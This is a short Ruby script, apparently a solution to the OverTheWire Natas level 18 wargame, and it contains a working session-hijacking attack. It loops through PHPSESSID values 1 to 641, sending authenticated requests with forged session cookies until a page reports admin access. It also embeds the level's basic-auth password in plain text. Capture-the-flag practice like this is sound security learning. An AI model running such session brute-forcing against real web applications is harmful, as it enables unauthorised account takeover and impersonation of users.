require 'uri'
require 'net/http'

def get id
    uri = URI.parse 'http://natas18.natas.labs.overthewire.org'
    req = Net::HTTP::Post.new uri
    req.basic_auth "natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"
    req['Cookie'] = "PHPSESSID=" + id.to_s
    res = Net::HTTP.start uri.hostname, uri.port do |http|
        http.request req
    end
    res.body
end

for id in 1..641
    puts "ID: " + id.to_s
    body = get id
    isAdmin = body.include? "You are an admin"
    if isAdmin
        puts body
        break
    end
end